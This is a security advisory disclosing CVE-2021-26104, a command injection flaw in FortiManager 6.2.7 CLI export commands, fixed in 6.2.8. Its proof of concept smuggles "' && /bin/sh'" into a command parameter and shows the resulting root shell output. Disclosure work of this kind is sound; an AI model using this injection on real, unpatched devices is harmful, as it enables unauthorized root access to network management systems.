# Fortinet FortiManager - Multiple OS command injection vulnerabilities (CVE-2021-26104)

Moderate

[orange-cert-cc](/orange-cert-cc)
published
GHSA-f73m-fvj3-m2pm
Nov 16, 2021

## Package

FortiManager
(Fortinet)

## Affected versions

6.2.7

## Patched versions

6.2.8

## Description

### Overview

On FortiManager, some CLI commands are vulnerable to command injection. As the software does not implement countermeasures, this allows an

attacker to spawn an interactive shell on the device. The vulnerable commands are only allowed to a **privileged** user (privilege "System Settings").

### Impact

Command injection

### Detail

On the CLI, some "diagnose" commands allow an administrator to export files (especially umlog and fmwslog) to an external FTP/SFTP.

The administrator provides hostname, user, password and target file name for the transfer. These parameters are not sanitized, and a command injection

is possible when these commands are executed with specially crafted parameters.

Futhermore, there is no countermeasures implemented. All the processes are running with root privleges, even the scripts and binaries handling

the inputs of a user. As a result, it is trivial to get an interactive shell on the device through this vulnerability.

### Proof of Concept

When connected to the CLI as a user with "System Settings", using a FTP transfer of umlog:

```
$ diagnose system export umlog ftp misc 127.0.0.1 user password directory "' && /bin/sh'"
Packing up the log files to /var/config/' && /bin/sh'
Copying files to temp folder...
cp: can't create '/var/config/umlog': Path does not exist
Generating file /var/config/' && /bin/sh'...
tar: Cowardly refusing to create an empty archive
Try 'tar --help' or 'tar --usage' for more information.
Transferring the package by FTP...
local folder: /var/config
local file:
remote folder:
remote file:
/fdsroot/bin/ftp_upload.sh: line 23: cd: /var/config: No such file or directory
/bin/ftp: connect to address 127.0.0.1: Connection refused
/bin/ftp: no response from host
Not connected.

Not connected.
/fdsroot/bin/ftp_upload.sh: line 33: cd: OLDPWD not set
/bin/sh: directory: No such file or directory
Removing temp files...
sh-4.3# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.3# uname -a
Linux OGSB-FMG-Infra 4.4.182 #1 SMP Wed Nov 18 09:58:02 PST 2020 x86_64 GNU/Linux

```

**Note:** A SFTP transfer would also do the trick. Furthermore, other parameters of the same command might be injectable too (directory, host, ...).

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
